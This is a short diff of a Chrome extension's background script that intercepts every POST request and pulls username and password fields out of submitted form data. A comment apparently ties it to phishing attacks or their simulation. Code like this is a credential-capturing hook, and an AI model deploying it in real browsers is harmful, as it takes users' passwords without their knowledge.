@@ -157,15 +157,17 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
  * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
  */
 chrome.webRequest.onBeforeRequest.addListener(function(details){
-	if(details.method == "POST"){
+	console.log('pls gimme form data for this: '+details.method+' request!');
+	if(details.method === "POST"){
+		console.log('oh yeah tasty form data');
 		var formData = details.requestBody.formData;
 		var credential = {'url':details.url};
 		var complex = {'url':details.url};
 
 		if(formData){
 			Object.keys(formData).forEach(function(key){
-				if(key.match("formurl")){};		//ignore this, it appears in all predefined phishing attacks
-				if(key.match("username")||key.match("password")){
+				if(!(key.match("formurl") == undefined)){};		//ignore this, it appears in all predefined phishing attacks
+				if(!(key.match("username") == undefined)||!(key.match("password") == undefined)){
 					credential[key]=formData[key];
 				}
 				else{
